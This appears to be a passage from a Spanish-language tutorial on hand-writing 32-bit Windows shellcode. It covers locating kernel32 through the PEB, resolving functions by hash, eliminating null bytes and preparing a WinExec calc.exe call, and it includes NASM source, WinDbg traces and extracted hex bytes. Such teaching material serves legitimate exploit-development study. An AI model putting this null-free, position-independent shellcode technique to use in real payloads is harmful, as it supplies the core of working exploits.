<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=774a9070 ebx=77480000 ecx=00000000 edx=00f71000 esi=779bab5c edi=014e2388
eip=00f71015 esp=013ffe98 ebp=013ffec4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
shellcode+0x1015:
00f71015 31c9            xor     ecx,ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=774a9070 ebx=77480000 ecx=00000000 edx=00f71000 esi=779bab5c edi=014e2388
eip=00f71017 esp=013ffe98 ebp=013ffec4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x1017:
00f71017 51              push    ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=774a9070 ebx=77480000 ecx=00000000 edx=00f71000 esi=779bab5c edi=014e2388
eip=00f71018 esp=013ffe94 ebp=013ffec4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x1018:
00f71018 6aff            push    0FFFFFFFFh

</span><span class="ro">0:000> </span><span class="p">p
eax=774a9070 ebx=77480000 ecx=00000000 edx=00f71000 esi=779bab5c edi=014e2388
eip=00f7101a esp=013ffe90 ebp=013ffec4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x101a:
00f7101a ffd0            call    eax {KERNEL32!TerminateProcessStub (774a9070)}  

</span><span class="ro">0:000> </span><span class="p">p
eax=774a9070 ebx=77480000 ecx=013ffe78 edx=77931670 esi=779bab5c edi=014e2388
eip=77931670 esp=013ffe78 ebp=013ffe88 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
77931670 c3              ret</span>
</code></pre></div></div><br>

<p class="plain-text">Actualmente nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> se ve de la siguiente forma, hemos logrado cargar funciones de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> y ejecutarlas sin embargo aun tenemos un problema</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">int3
    </span><span class="o">mov </span><span class="mi">ebp</span><span class="p">, </span><span class="mi">esp                    </span><span class="c1">; new stack frame
    </span><span class="o">sub </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x28                   </span><span class="c1">; space for variables

    </span><span class="o">call .</span><span class="na">find_kernel32             </span><span class="c1">; find kernel32

    </span><span class="o">push </span><span class="mi">0x8ee05933                 </span><span class="c1">; TerminateProcess() hash
    </span><span class="o">call .</span><span class="na">find_function             </span><span class="c1">; find TerminateProcess()

    </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">ecx                    </span><span class="c1">; $ecx = 0x0
    </span><span class="o">push </span><span class="mi">ecx                        </span><span class="c1">; uExitCode
    </span><span class="o">push </span><span class="mi">0xffffffff                 </span><span class="c1">; hProcess
    </span><span class="o">call </span><span class="mi">eax                        </span><span class="c1">; call TerminateProcess()

    </span><span class="o">.</span><span class="na">find_kernel32</span><span class="p">:
        </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">                ; TEB structure
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">fs</span><span class="p">:</span><span class="mi"> ecx</span><span class="o"> + </span><span class="mi">0x30</span><span class="p">] </span><span class="c1">  ; PEB Address
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="o"> +</span><span class="mi"> 0xc</span><span class="p">]</span><span class="c1">        ; ntdll!PebLdr
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="o"> +</span><span class="mi"> 0x14</span><span class="p">]       </span><span class="c1">; InMemoryOrderModuleList
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="p">]</span><span class="c1">              ; ntdll.dll
        </span><span class="o">lodsd</span><span class="c1">                       ; kernel32.dll
        </span><span class="o">mov</span><span class="mi"> ebx</span><span class="p">, [</span><span class="mi">eax</span><span class="o"> +</span><span class="mi"> 0x10</span><span class="p">]</span><span class="c1">       ; kernel32 base
        </span><span class="o">ret                         </span><span class="c1">; return

    </span><span class="o">.</span><span class="na">find_function</span><span class="p">:
        </span><span class="o">pusha                       </span><span class="c1">; save all registers
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebx </span><span class="o">+ </span><span class="mi">0x3c</span><span class="p">]       </span><span class="c1">; RVA to PE signature
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, [</span><span class="mi">ebx</span><span class="o"> + </span><span class="mi">eax </span><span class="o">+ </span><span class="mi">0x78</span><span class="p">] </span><span class="c1">; RVA of Export Table
        </span><span class="o">add </span><span class="mi">edi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Export Table
        </span><span class="o">mov </span><span class="mi">ecx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x18</span><span class="p">]       </span><span class="c1">; NR of Names
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x20</span><span class="p">]       </span><span class="c1">; RVA of Name Pointer Table
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Name Pointer Table
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">], </span><span class="mi">eax        </span><span class="c1">; var4 = Name Pointer Table

    </span><span class="o">.</span><span class="na">find_loop</span><span class="p">:
        </span><span class="o">jecxz .</span><span class="na">find_end             </span><span class="c1">; if ecx = 0x0
        </span><span class="o">dec </span><span class="mi">ecx                     </span><span class="c1">; counter -= 1
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">]        </span><span class="c1">; $eax = Name Pointer Table
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">eax </span><span class="o">+ </span><span class="mi">ecx </span><span class="o">* </span><span class="mi">4</span><span class="p">]    </span><span class="c1">; RVA of symbol name
        </span><span class="o">add </span><span class="mi">esi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; symbol name<

        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">cdq                         </span><span class="c1">; $edx = 0x0

    </span><span class="o">.</span><span class="na">compute_hash</span><span class="p">:
        </span><span class="o">lodsb                       </span><span class="c1">; load in al next byte from esi
        </span><span class="o">test </span><span class="mi">al</span><span class="p">, </span><span class="mi">al                 </span><span class="c1">; check null terminator
        </span><span class="o">jz .</span><span class="na">find_end                </span><span class="c1">; If ZF == 1
        </span><span class="o">ror </span><span class="mi">edx</span><span class="p">, </span><span class="mi">0x2f               </span><span class="c1">; rot 47
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; add new byte
        </span><span class="o">jmp .</span><span class="na">compute_hash           </span><span class="c1">; loop

   </span><span class="o">.</span><span class="na">compare_hash</span><span class="p">:
        </span><span class="o">cmp </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; cmp edx, hash
        </span><span class="o">jnz .</span><span class="na">find_loop              </span><span class="c1">; if zf != 1
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; RVA of Ordinal Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Ordinal Table
        </span><span class="o">mov </span><span class="mi">cx</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">2 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]     </span><span class="c1">; extrapolate ordinal functions
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">]       </span><span class="c1">; RVA of Address Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Address Table
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">4 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]    </span><span class="c1">; RVA of function
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; overwrite eax from pushad

    </span><span class="o">.</span><span class="na">find_end</span><span class="p">:
        </span><span class="o">popa                        </span><span class="c1">; restore registers
        </span><span class="o">ret                         </span><span class="c1">; return</span>
</code></pre></div></div><br>

<p class="plain-text">Al compilar el <code class="language-plaintext highlighter-rouge">shellcode</code> y mostrarlo en formato hexadecimal notamos algo que nos dara muchos problemas y son los <code class="language-plaintext highlighter-rouge">0x00</code> que encontramos a lo largo de el</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m elf_i386 -o shellcode

</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:' </span><span class="p">| </span><span class="ve">grep </span><span class="p">-v </span><span class="am">'shellcode'</span><span class="p"> | </span><span class="ve">cut</span><span class="p"> -f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> | </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s
\xcc\x89\xe5\x83\xec\x28\xe8\x11\x00\x00\x00\x68\x33\x59\xe0\x8e\xe8\x1a\x00\x00\x00\x31\xc9\x51\x6a\xff\xff\xd0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x14\x8b\x36\xad\x8b\x58\x10\xc3\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x35\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xac\x84\xc0\x74\x24\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe0\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3  </span>
</code></pre></div></div><br>
</section>

<section class="post" id="null">
<br><h3 class="post-title">Null bytes</h3><br>

<p class="plain-text">La principal razón de los <code class="language-plaintext highlighter-rouge">0x00</code> viene en las instrucciones de <code class="language-plaintext highlighter-rouge">call</code> a las funciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1680.167c): Break instruction exception - code 80000003 (first chance)
eax=013ffc88 ebx=011e6000 ecx=00d01000 edx=00d01000 esi=00d01000 edi=00d01000  
eip=00d01000 esp=013ffc30 ebp=013ffc3c iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
shellcode+0x1000:
00d01000 cc              int     3

</span><span class="ro">0:000> </span><span class="p">u eip L7
shellcode+0x1000:
00d01000 cc              int     3
00d01001 89e5            mov     ebp,esp
00d01003 83ec28          sub     esp,28h
00d01006 e811000000      call    shellcode+0x101c (00d0101c)
00d0100b 683359e08e      push    8EE05933h
00d01010 e822000000      call    shellcode+0x1037 (00d01037)
00d01015 31c9            xor     ecx,ecx</span>
</code></pre></div></div><br>

<p class="plain-text">Una forma de resolver este problema es reorganizando el código además de guardar la dirección de <code class="language-plaintext highlighter-rouge">.find_function</code> en una variable de <code class="language-plaintext highlighter-rouge">ebp</code> en este caso <code class="language-plaintext highlighter-rouge">var8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">int3
    </span><span class="o">mov </span><span class="mi">ebp</span><span class="p">, </span><span class="mi">esp                    </span><span class="c1">; new stack frame
    </span><span class="o">sub </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x28                   </span><span class="c1">; space for variables

    </span><span class="o">.</span><span class="na">find_kernel32</span><span class="p">:
        </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">                ; TEB structure
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">fs</span><span class="p">:</span><span class="mi"> ecx</span><span class="o"> + </span><span class="mi">0x30</span><span class="p">] </span><span class="c1">  ; PEB Address
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="o"> +</span><span class="mi"> 0xc</span><span class="p">]</span><span class="c1">        ; ntdll!PebLdr
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="o"> +</span><span class="mi"> 0x14</span><span class="p">]       </span><span class="c1">; InMemoryOrderModuleList
        </span><span class="o">mov</span><span class="mi"> esi</span><span class="p">, [</span><span class="mi">esi</span><span class="p">]</span><span class="c1">              ; ntdll.dll
        </span><span class="o">lodsd</span><span class="c1">                       ; kernel32.dll
        </span><span class="o">mov</span><span class="mi"> ebx</span><span class="p">, [</span><span class="mi">eax</span><span class="o"> +</span><span class="mi"> 0x10</span><span class="p">]</span><span class="c1">       ; kernel32 base

        </span><span class="o">jmp .</span><span class="na">find_short             </span><span class="c1">; short jump

    </span><span class="o">.</span><span class="na">find_ret</span><span class="p">:
        </span><span class="o">pop </span><span class="mi">esi                     </span><span class="c1">; $esi = return addr
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">], </span><span class="mi">esi        </span><span class="c1">; var8 = .find_function
        </span><span class="o">jmp .</span><span class="na">symbol_kernel32        </span><span class="c1">; load function from kernel32

    </span><span class="o">.</span><span class="na">find_short</span><span class="p">:
        </span><span class="o">call .</span><span class="na">find_ret              </span><span class="c1">; relative call

    </span><span class="o">.</span><span class="na">find_function</span><span class="p">:
        </span><span class="o">pusha                       </span><span class="c1">; save all registers
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebx </span><span class="o">+ </span><span class="mi">0x3c</span><span class="p">]       </span><span class="c1">; RVA to PE signature
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, [</span><span class="mi">ebx</span><span class="o"> + </span><span class="mi">eax </span><span class="o">+ </span><span class="mi">0x78</span><span class="p">] </span><span class="c1">; RVA of Export Table
        </span><span class="o">add </span><span class="mi">edi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Export Table
        </span><span class="o">mov </span><span class="mi">ecx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x18</span><span class="p">]       </span><span class="c1">; NR of Names
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x20</span><span class="p">]       </span><span class="c1">; RVA of Name Pointer Table
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Name Pointer Table
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">], </span><span class="mi">eax        </span><span class="c1">; var4 = Name Pointer Table

    </span><span class="o">.</span><span class="na">find_loop</span><span class="p">:
        </span><span class="o">jecxz .</span><span class="na">find_end             </span><span class="c1">; if ecx = 0x0
        </span><span class="o">dec </span><span class="mi">ecx                     </span><span class="c1">; counter -= 1
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">]        </span><span class="c1">; $eax = Name Pointer Table
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">eax </span><span class="o">+ </span><span class="mi">ecx </span><span class="o">* </span><span class="mi">4</span><span class="p">]    </span><span class="c1">; RVA of symbol name
        </span><span class="o">add </span><span class="mi">esi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; symbol name

        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">cdq                         </span><span class="c1">; $edx = 0x0

    </span><span class="o">.</span><span class="na">compute_hash</span><span class="p">:
        </span><span class="o">lodsb                       </span><span class="c1">; load in al next byte from esi
        </span><span class="o">test </span><span class="mi">al</span><span class="p">, </span><span class="mi">al                 </span><span class="c1">; check null terminator
        </span><span class="o">jz .</span><span class="na">compare_hash            </span><span class="c1">; If ZF == 1
        </span><span class="o">ror </span><span class="mi">edx</span><span class="p">, </span><span class="mi">0x2f               </span><span class="c1">; rot 47
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; add new byte
        </span><span class="o">jmp .</span><span class="na">compute_hash           </span><span class="c1">; loop

   </span><span class="o">.</span><span class="na">compare_hash</span><span class="p">:
        </span><span class="o">cmp </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; cmp edx, hash
        </span><span class="o">jnz .</span><span class="na">find_loop              </span><span class="c1">; if zf != 1
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; RVA of Ordinal Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Ordinal Table
        </span><span class="o">mov </span><span class="mi">cx</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">2 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]     </span><span class="c1">; extrapolate ordinal functions
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">]       </span><span class="c1">; RVA of Address Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Address Table
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">4 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]    </span><span class="c1">; RVA of function
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; overwrite eax from pushad

    </span><span class="o">.</span><span class="na">find_end</span><span class="p">:
        </span><span class="o">popa                        </span><span class="c1">; restore registers
        </span><span class="o">ret                         </span><span class="c1">; return

    </span><span class="o">.</span><span class="na">symbol_kernel32</span><span class="p">:
        </span><span class="o">push </span><span class="mi">0x8ee05933             </span><span class="c1">; TerminateProcess() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0xc</span><span class="p">]</span><span class="p">, </span><span class="mi">eax        </span><span class="c1">; var12 = ptr to TerminateProcess()

    </span><span class="o">.</span><span class="na">exit</span><span class="p">:
        </span><span class="o">cdq </span><span class="c1">                        ; $edx = 0x0
        </span><span class="o">push </span><span class="mi">edx                    </span><span class="c1">; uExitCode
        </span><span class="o">push </span><span class="mi">0xffffffff             </span><span class="c1">; hProcess
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0xc</span><span class="p">]            </span><span class="c1">; call TerminateProcess()</span>
</code></pre></div></div><br>

<p class="plain-text">Saltamos hasta la parte que nos interesa que es después de encontrar la base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, ejecuta un salto a <code class="language-plaintext highlighter-rouge">.find_short</code>, y este llama a <code class="language-plaintext highlighter-rouge">.find_ret</code>, despues de ello guarda en <code class="language-plaintext highlighter-rouge">esi</code> la dirección de retorno que apunta a <code class="language-plaintext highlighter-rouge">.find_function</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=779bab5c edi=00b32388  
eip=00dc1020 esp=009ffb38 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x1020:
00dc1020 eb06            jmp     shellcode+0x1028 (00dc1028)

</span><span class="ro">0:000> </span><span class="p">p
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=779bab5c edi=00b32388   
eip=00dc1028 esp=009ffb38 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x1028:
00dc1028 e8f5ffffff      call    shellcode+0x1022 (00dc1022)

</span><span class="ro">0:000> </span><span class="p">t
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=779bab5c edi=00b32388
eip=00dc1022 esp=009ffb34 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x1022:
00dc1022 5e              pop     esi

</span><span class="ro">0:000> </span><span class="p">u poi(esp)
shellcode+0x102d:
00dc102d 60              pushad
00dc102e 8b433c          mov     eax,dword ptr [ebx+3Ch]
00dc1031 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
00dc1035 01df            add     edi,ebx
00dc1037 8b4f18          mov     ecx,dword ptr [edi+18h]
00dc103a 8b4720          mov     eax,dword ptr [edi+20h]
00dc103d 01d8            add     eax,ebx
00dc103f 8945fc          mov     dword ptr [ebp-4],eax</span>
</code></pre></div></div><br>

<p class="plain-text">Después guardamos la dirección de <code class="language-plaintext highlighter-rouge">.find_function</code> en la variable de <code class="language-plaintext highlighter-rouge">ebp - 8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=00dc102d edi=00b32388
eip=00dc1023 esp=009ffb38 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x1023:
00dc1023 8975f8          mov     dword ptr [ebp-8],esi ss:0023:009ffb58=00000000  

</span><span class="ro">0:000> </span><span class="p">p
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=00dc102d edi=00b32388  
eip=00dc1026 esp=009ffb38 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x1026:
00dc1026 eb54            jmp     shellcode+0x107c (00dc107c)

</span><span class="ro">0:000> </span><span class="p">u poi(ebp - 8)
shellcode+0x102d:
00dc102d 60              pushad
00dc102e 8b433c          mov     eax,dword ptr [ebx+3Ch]
00dc1031 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
00dc1035 01df            add     edi,ebx
00dc1037 8b4f18          mov     ecx,dword ptr [edi+18h]
00dc103a 8b4720          mov     eax,dword ptr [edi+20h]
00dc103d 01d8            add     eax,ebx
00dc103f 8945fc          mov     dword ptr [ebp-4],eax</span>
</code></pre></div></div><br>

<p class="plain-text">Luego pasamos a <code class="language-plaintext highlighter-rouge">.symbol_kernel32</code> y para resolver el simbolo <code class="language-plaintext highlighter-rouge">TerminateProcess</code> empujamos el hash pero en lugar de llamar directamente a <code class="language-plaintext highlighter-rouge">.find_function</code> llamamos a <code class="language-plaintext highlighter-rouge">[ebp - 8]</code> que lo contiene, y como el resultado queda en <code class="language-plaintext highlighter-rouge">eax</code> lo movemos a la variable <code class="language-plaintext highlighter-rouge">var - 12</code>, entonces al llamar a <code class="language-plaintext highlighter-rouge">TerminateProcess</code> llamamos a la variable que lo almacena, como llamamos a una variable evitamos null bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=00dc102d edi=00b32388
eip=00dc107c esp=009ffb38 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x107c:
00dc107c 683359e08e      push    8EE05933h

</span><span class="ro">0:000> </span><span class="p">p
eax=b3bfe348 ebx=77480000 ecx=00000000 edx=00dc1000 esi=00dc102d edi=00b32388
eip=00dc1081 esp=009ffb34 ebp=009ffb60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x1081:
00dc1081 ff55f8          call    dword ptr [ebp-8]    ss:0023:009ffb58=00dc102d

</span><span class="ro">0:000> </span><span class="p">p
eax=774a9070 ebx=77480000 ecx=00000000 edx=00dc1000 esi=00dc102d edi=00b32388
eip=00dc1084 esp=009ffb34 ebp=009ffb60 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
shellcode+0x1084:
00dc1084 8945f4          mov     dword ptr [ebp-0Ch],eax ss:0023:009ffb54=00000000

</span><span class="ro">0:000> </span><span class="p">u eax
KERNEL32!TerminateProcessStub:
774a9070 8bff            mov     edi,edi
774a9072 55              push    ebp
774a9073 8bec            mov     ebp,esp
774a9075 5d              pop     ebp
774a9076 ff2534495077    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (77504934)]  
774a907c cc              int     3
774a907d cc              int     3
774a907e cc              int     3

</span><span class="ro">0:000> </span><span class="p">g
eax=774a9070 ebx=77480000 ecx=009ffb14 edx=77931670 esi=00dc102d edi=00b32388
eip=77931670 esp=009ffb14 ebp=009ffb24 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
77931670 c3              ret</span>
</code></pre></div></div><br>

</section>

<section class="post" id="calc">
<br><h3 class="post-title">Exec calc.exe</h3><br>

<p class="plain-text">Para ejecutar una calculadora podemos usar la función <code class="language-plaintext highlighter-rouge">WinExec</code> que esta dentro de <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, lo primero sera resolver el simbolo y almacenarlo en una variable, como podemos ver la forma de resolver los simbolos se resume a 3 instrucciones, empujar el <code class="language-plaintext highlighter-rouge">hash</code>, llamar a la variable que contiene <code class="language-plaintext highlighter-rouge">.find_funcion</code> y almacenar el resultado en una <code class="language-plaintext highlighter-rouge">variable</code>, esto reduce significativamente el tamaño del shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">symbol_kernel32</span><span class="p">:
        </span><span class="o">push </span><span class="mi">0x8ee05933             </span><span class="c1">; TerminateProcess() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0xc</span><span class="p">], </span><span class="mi">eax        </span><span class="c1">; var12 = ptr to TerminateProcess()  

        </span><span class="o">push </span><span class="mi">0x10121ee3             </span><span class="c1">; WinExec() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x10</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var16 = ptr to WinExec()</span>
</code></pre></div></div><br>

